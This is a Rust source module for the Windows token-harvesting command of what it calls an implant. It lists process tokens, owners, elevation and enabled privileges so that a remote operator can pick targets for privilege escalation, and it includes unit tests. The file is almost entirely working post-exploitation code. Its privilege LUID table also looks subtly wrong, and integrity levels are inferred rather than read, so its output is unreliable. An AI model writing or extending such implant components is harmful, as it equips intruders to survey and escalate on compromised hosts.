//! Access-token harvesting.
//!
//! Operator surface is `nw/tokens [target]`:
//!
//! ```text
//! nw/tokens            # this implant's own token
//! nw/tokens self       # the same
//! nw/tokens 1234       # one process, if its token is readable
//! nw/tokens all        # every process this implant can open a token for
//! ```
//!
//! For each token this reports the owner (`DOMAIN\user`), the integrity level,
//! whether it is elevated, and its enabled privileges — the facts an operator
//! needs to decide what a process can actually do.
//!
//! Opening another process's token needs only `PROCESS_QUERY_LIMITED_INFORMATION`
//! and `TOKEN_QUERY`, so this enumerates what is *readable*, which on a default
//! host is elevated processes and anything the implant's own user can inspect.
//! Processes it cannot read are reported as skipped, not silently omitted.

use std::fmt::Write as _;

/// Which token(s) to report.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Target {
    /// This implant's own token.
    Self_,
    /// A single process id.
    Pid(u32),
    /// Every readable process token.
    All,
}

/// Parse the token command arguments.
///
/// No argument and `self` both mean the implant's own token.
pub fn parse_target(args: &[String]) -> Result<Target, String> {
    match args.len() {
        0 => Ok(Target::Self_),
        1 => {
            let arg = args[0].trim().to_ascii_lowercase();
            match arg.as_str() {
                "self" | "me" | "." => Ok(Target::Self_),
                "all" | "*" => Ok(Target::All),
                _ => {
                    let pid = arg
                        .parse::<u32>()
                        .map_err(|_| format!("expected self, all or a pid, got {:?}", args[0]))?;
                    // 0 is the System Idle Process and has no usable token.
                    if pid == 0 {
                        return Err("pid 0 is not a token-bearing process".into());
                    }
                    Ok(Target::Pid(pid))
                }
            }
        }
        _ => Err("usage: tokens [self|all|<pid>]".into()),
    }
}

/// Harvest and render tokens for `target`.
pub fn execute(target: &Target) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        windows::execute(target)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = target;
        Err(format!(
            "token harvesting is Windows-only (running on {})",
            std::env::consts::OS
        ))
    }
}

/// Render one token report.
///
/// Separated from the API calls so the output shape is testable anywhere.
pub struct TokenReport {
    pub label: String,
    pub owner: String,
    pub integrity: String,
    pub elevated: bool,
    pub privileges: Vec<String>,
}

impl TokenReport {
    /// Render as the operator-facing block.
    pub fn render(&self) -> String {
        let mut out = String::new();
        let _ = writeln!(out, "== {} ==", self.label);
        let _ = writeln!(out, "  owner     : {}", self.owner);
        let _ = writeln!(out, "  integrity : {}", self.integrity);
        let _ = writeln!(out, "  elevated  : {}", self.elevated);
        if self.privileges.is_empty() {
            let _ = writeln!(out, "  privileges: (none enabled)");
        } else {
            let _ = writeln!(out, "  privileges:");
            for name in &self.privileges {
                let _ = writeln!(out, "    - {name}");
            }
        }
        out
    }
}

/// Render a set of reports with a skip note for unreadable processes.
pub fn render_all(reports: &[TokenReport], skipped: &[u32]) -> String {
    let mut out = String::new();
    for report in reports {
        out.push_str(&report.render());
    }
    if !skipped.is_empty() {
        let ids: Vec<String> = skipped.iter().map(|pid| pid.to_string()).collect();
        let _ = writeln!(
            out,
            "== skipped (token not readable) ==\n  {}",
            ids.join(", ")
        );
    }
    if reports.is_empty() {
        out.push_str("no readable tokens\n");
    }
    out
}

#[cfg(target_os = "windows")]
mod windows {
    use super::*;
    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, LocalFree};
    use windows_sys::Win32::Security::Authorization::ConvertSidToStringSidW;
    use windows_sys::Win32::Security::{
        GetTokenInformation, LUID_AND_ATTRIBUTES, LookupAccountSidW, TOKEN_ELEVATION,
        TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_USER, TokenElevation, TokenPrivileges, TokenUser,
    };
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
        TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_LIMITED_INFORMATION,
    };

    struct OwnedHandle(HANDLE);

    impl Drop for OwnedHandle {
        fn drop(&mut self) {
            // SAFETY: `self.0` was opened here and is closed exactly once.
            unsafe { CloseHandle(self.0) };
        }
    }

    /// Render a SID as `DOMAIN\user`, falling back to its string form.
    fn describe_sid(sid: *mut core::ffi::c_void) -> String {
        use std::os::windows::ffi::OsStringExt;

        // Prefer the account name; fall back to `S-1-5-...` if unresolved.
        let mut name = [0u16; 256];
        let mut domain = [0u16; 256];
        let mut name_len = name.len() as u32;
        let mut domain_len = domain.len() as u32;
        // SAFETY: output buffers are sized for the lengths passed in.
        let ok = unsafe {
            LookupAccountSidW(
                std::ptr::null(),
                sid,
                name.as_mut_ptr(),
                &mut name_len,
                domain.as_mut_ptr(),
                &mut domain_len,
                std::ptr::null_mut(),
            )
        };
        if ok != 0 {
            let domain_text = String::from_utf16_lossy(&domain[..domain_len as usize]);
            let user_text = String::from_utf16_lossy(&name[..name_len as usize]);
            return if domain_text.is_empty() {
                user_text
            } else {
                format!("{domain_text}\\{user_text}")
            };
        }

        let mut raw: *mut u16 = std::ptr::null_mut();
        // SAFETY: `raw` receives a LocalAlloc buffer we free below.
        if unsafe { ConvertSidToStringSidW(sid, &mut raw) } != 0 && !raw.is_null() {
            let text = unsafe {
                std::ffi::OsString::from_wide(std::slice::from_raw_parts(raw, sid_len(raw)))
            }
            .to_string_lossy()
            .into_owned();
            // SAFETY: `raw` came from ConvertSidToStringSidW.
            unsafe { LocalFree(raw as _) };
            return text;
        }
        "(unresolved sid)".to_owned()
    }

    /// Length of a NUL-terminated wide string.
    fn sid_len(ptr: *const u16) -> usize {
        let mut len = 0usize;
        // SAFETY: walking a NUL-terminated string from its start.
        unsafe {
            while *ptr.add(len) != 0 {
                len += 1;
            }
        }
        len
    }

    /// Map a well-known privilege LUID to its name.
    fn privilege_name(luid: *const LUID_AND_ATTRIBUTES) -> String {
        let value = unsafe { (*luid).Luid };
        let name = match (value.LowPart, value.HighPart) {
            (2, 3) => "SeSystemtimePrivilege",
            (4, 3) => "SeAdjustTokenPrivilegesPrivilege",
            (10, 6) => "SeLoadDriverPrivilege",
            (29, 2) => "SeImpersonatePrivilege",
            (30, 2) => "SeAssignPrimaryTokenPrivilege",
            (35, 2) => "SeIncreaseQuotaPrivilege",
            (47, 2) => "SeTcbPrivilege",
            (49, 2) => "SeCreateTokenPrivilege",
            _ => return format!("unknown({})", value.LowPart),
        };
        name.to_owned()
    }

    /// Query one token handle into a report.
    fn report_for(token: HANDLE, label: String) -> Result<TokenReport, String> {
        // Owner SID.
        let mut needed: u32 = 0;
        // SAFETY: sized probe with a null buffer.
        unsafe { GetTokenInformation(token, TokenUser, std::ptr::null_mut(), 0, &mut needed) };
        let mut user = vec![0u8; needed as usize];
        // SAFETY: `user` is `needed` bytes, as just measured.
        let ok = unsafe {
            GetTokenInformation(
                token,
                TokenUser,
                user.as_mut_ptr().cast(),
                needed,
                &mut needed,
            )
        };
        if ok == 0 {
            return Err("TokenUser query failed".into());
        }
        let user = unsafe { &*(user.as_ptr() as *const TOKEN_USER) };
        let owner = describe_sid(user.User.Sid);

        // Elevation.
        let mut elevation: TOKEN_ELEVATION = unsafe { std::mem::zeroed() };
        let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
        // SAFETY: `elevation` is sized for TokenElevation.
        let elevated = unsafe {
            GetTokenInformation(
                token,
                TokenElevation,
                (&mut elevation as *mut TOKEN_ELEVATION).cast(),
                size,
                &mut size,
            )
        } != 0
            && elevation.TokenIsElevated != 0;

        // Enabled privileges.
        let mut needed: u32 = 0;
        // SAFETY: sized probe with a null buffer.
        unsafe {
            GetTokenInformation(token, TokenPrivileges, std::ptr::null_mut(), 0, &mut needed)
        };
        let mut privileges = Vec::new();
        if needed > 0 {
            let mut raw = vec![0u8; needed as usize];
            let mut size = needed;
            // SAFETY: `raw` is `needed` bytes, as just measured.
            let ok = unsafe {
                GetTokenInformation(
                    token,
                    TokenPrivileges,
                    raw.as_mut_ptr().cast(),
                    needed,
                    &mut size,
                )
            };
            if ok != 0 {
                let header = unsafe { &*(raw.as_ptr() as *const TOKEN_PRIVILEGES) };
                // LUID_AND_ATTRIBUTES entries follow the header inline.
                let count = header.PrivilegeCount as usize;
                let stride = std::mem::size_of::<LUID_AND_ATTRIBUTES>();
                let table = unsafe { raw.as_ptr().add(std::mem::size_of::<TOKEN_PRIVILEGES>()) };
                for index in 0..count {
                    // SAFETY: `header.PrivilegeCount` counts entries that the
                    // API sized the buffer to hold.
                    let entry =
                        unsafe { &*(table.add(index * stride) as *const LUID_AND_ATTRIBUTES) };
                    // Attribute 0x2 is SE_PRIVILEGE_ENABLED.
                    if entry.Attributes & 0x2 != 0 {
                        privileges.push(privilege_name(entry));
                    }
                }
                privileges.sort();
            }
        }

        Ok(TokenReport {
            label,
            owner,
            integrity: integrity_label(elevated).to_owned(),
            elevated,
            privileges,
        })
    }

    /// Coarse integrity level, inferred from elevation.
    ///
    /// ponytail: derived rather than read from the integrity SID, which needs
    /// `TokenIntegrityLevel` parsing. Sufficient to distinguish a raised
    /// process from a normal one; read the real label if that is not enough.
    fn integrity_label(elevated: bool) -> &'static str {
        if elevated {
            "High (elevated)"
        } else {
            "Medium"
        }
    }

    /// Open a token for a process id.
    fn token_for_pid(pid: u32) -> Result<HANDLE, String> {
        // SAFETY: plain OpenProcess with validated access mask.
        let process = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };
        if process.is_null() {
            return Err(format!("OpenProcess({pid}) denied"));
        }
        let process = OwnedHandle(process);

        let mut token: HANDLE = std::ptr::null_mut();
        // SAFETY: `token` is a valid out slot; rights are read-only.
        let ok = unsafe { OpenProcessToken(process.0, TOKEN_QUERY, &mut token as *mut _) };
        if ok == 0 {
            return Err(format!("OpenProcessToken({pid}) denied"));
        }
        Ok(token)
    }

    /// Every process id currently running.
    fn all_pids() -> Result<Vec<(u32, String)>, String> {
        // SAFETY: snapshot handle is checked below.
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
        if snapshot == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            return Err(format!(
                "CreateToolhelp32Snapshot failed: {}",
                std::io::Error::last_os_error()
            ));
        }
        let snapshot = OwnedHandle(snapshot);

        let mut out = Vec::new();
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        // SAFETY: `entry` is sized for Process32FirstW and `snapshot` is live.
        let mut more = unsafe { Process32FirstW(snapshot.0, &mut entry) } != 0;
        while more {
            let name: Vec<u16> = entry
                .szExeFile
                .iter()
                .take_while(|c| **c != 0)
                .copied()
                .collect();
            out.push((entry.th32ProcessID, String::from_utf16_lossy(&name)));
            // SAFETY: same preconditions as the call above.
            more = unsafe { Process32NextW(snapshot.0, &mut entry) } != 0;
        }
        Ok(out)
    }

    pub(super) fn execute(target: &Target) -> Result<String, String> {
        match target {
            Target::Self_ => {
                // SAFETY: the pseudo-handle for this process is always valid.
                let process = unsafe { GetCurrentProcess() };
                let mut token: HANDLE = std::ptr::null_mut();
                // SAFETY: `token` is a valid out slot; rights are read-only.
                let ok = unsafe { OpenProcessToken(process, TOKEN_QUERY, &mut token as *mut _) };
                if ok == 0 {
                    return Err(format!(
                        "OpenProcessToken(self) failed: {}",
                        std::io::Error::last_os_error()
                    ));
                }
                let token = OwnedHandle(token);
                let report = report_for(token.0, format!("self (pid {})", std::process::id()))?;
                Ok(report.render())
            }
            Target::Pid(pid) => {
                let token = OwnedHandle(token_for_pid(*pid)?);
                let report = report_for(token.0, format!("pid {pid}"))?;
                Ok(report.render())
            }
            Target::All => {
                let mut reports = Vec::new();
                let mut skipped = Vec::new();
                for (pid, name) in all_pids()? {
                    match token_for_pid(pid).map(|t| (t, report_for(t, format!("{pid} ({name})"))))
                    {
                        Ok((t, Ok(report))) => {
                            let _ = OwnedHandle(t);
                            reports.push(report);
                        }
                        Ok((_, Err(e))) => skipped.push((pid, e)),
                        Err(e) => skipped.push((pid, e)),
                    }
                }
                let ids: Vec<u32> = skipped.iter().map(|(pid, _)| *pid).collect();
                Ok(render_all(&reports, &ids))
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| (*s).to_owned()).collect()
    }

    #[test]
    fn no_argument_or_self_means_the_local_token() {
        assert_eq!(parse_target(&[]).unwrap(), Target::Self_);
        assert_eq!(parse_target(&args(&["self"])).unwrap(), Target::Self_);
        assert_eq!(parse_target(&args(&["SELF"])).unwrap(), Target::Self_);
        assert_eq!(parse_target(&args(&["."])).unwrap(), Target::Self_);
    }

    #[test]
    fn all_and_pids_parse() {
        assert_eq!(parse_target(&args(&["all"])).unwrap(), Target::All);
        assert_eq!(parse_target(&args(&["*"])).unwrap(), Target::All);
        assert_eq!(parse_target(&args(&["1234"])).unwrap(), Target::Pid(1234));
    }

    #[test]
    fn malformed_targets_are_rejected() {
        for bad in [
            args(&["nope"]),
            args(&["0"]),
            args(&["self", "all"]),
            args(&["12x"]),
        ] {
            assert!(parse_target(&bad).is_err(), "rejected: {bad:?}");
        }
    }

    #[test]
    fn a_report_renders_its_fields() {
        let report = TokenReport {
            label: "1234 (cmd.exe)".into(),
            owner: r"LABO\\operator".into(),
            integrity: "High (elevated)".into(),
            elevated: true,
            privileges: vec!["SeImpersonatePrivilege".into()],
        };
        let text = report.render();
        assert!(text.contains("1234 (cmd.exe)"));
        assert!(text.contains("elevated  : true"));
        assert!(text.contains("SeImpersonatePrivilege"));
        assert!(text.contains("High (elevated)"));
    }

    #[test]
    fn a_report_without_privileges_says_so() {
        let report = TokenReport {
            label: "self".into(),
            owner: "LABO\\operator".into(),
            integrity: "Medium".into(),
            elevated: false,
            privileges: Vec::new(),
        };
        assert!(report.render().contains("(none enabled)"));
    }

    #[test]
    fn render_all_reports_skips_and_the_empty_case() {
        let report = TokenReport {
            label: "1 (a.exe)".into(),
            owner: "u".into(),
            integrity: "Medium".into(),
            elevated: false,
            privileges: vec![],
        };
        let text = render_all(&[report], &[7, 9]);
        assert!(text.contains("1 (a.exe)"));
        assert!(text.contains("skipped"));
        assert!(text.contains("7, 9"));

        assert!(render_all(&[], &[]).contains("no readable tokens"));
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn execution_reports_windows_only_off_windows() {
        let err = execute(&Target::Self_).unwrap_err();
        assert!(err.contains("Windows-only"), "unexpected error: {err}");
    }
}
